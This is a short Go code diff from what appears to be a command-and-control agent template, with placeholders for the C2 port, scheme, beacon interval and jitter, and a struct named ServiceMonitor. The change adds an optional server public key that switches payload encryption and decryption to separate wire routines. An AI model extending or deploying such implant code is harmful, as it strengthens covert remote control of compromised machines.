@@ -43,6 +43,7 @@ var (
 	configPort      = "{{C2_PORT}}"
 	configProtocol  = "{{C2_SCHEME}}"
 	configAuthToken = "{{ENCRYPTION_KEY}}"
+	configServerPub = ""
 	pollInterval    = "{{BEACON_INTERVAL}}"
 	pollJitter      = "{{BEACON_JITTER}}"
 	agentMode       = "{{AGENT_MODE}}" // "beacon" or "streaming"
@@ -116,6 +117,9 @@ func deriveAuthKey(token string) []byte {
 }
 
 func (sm *ServiceMonitor) encryptPayload(data []byte) (string, error) {
+	if strings.TrimSpace(configServerPub) != "" {
+		return wireEncrypt(string(data))
+	}
 	key := deriveAuthKey(configAuthToken)
 	block, err := aes.NewCipher(key)
 	if err != nil {
@@ -136,6 +140,13 @@ func (sm *ServiceMonitor) encryptPayload(data []byte) (string, error) {
 }
 
 func (sm *ServiceMonitor) decryptPayload(encoded string) ([]byte, error) {
+	if strings.TrimSpace(configServerPub) != "" {
+		pt, err := wireDecrypt(encoded)
+		if err != nil {
+			return nil, err
+		}
+		return []byte(pt), nil
+	}
 	raw, err := base64.StdEncoding.DecodeString(encoded)
 	if err != nil {
 		return nil, err
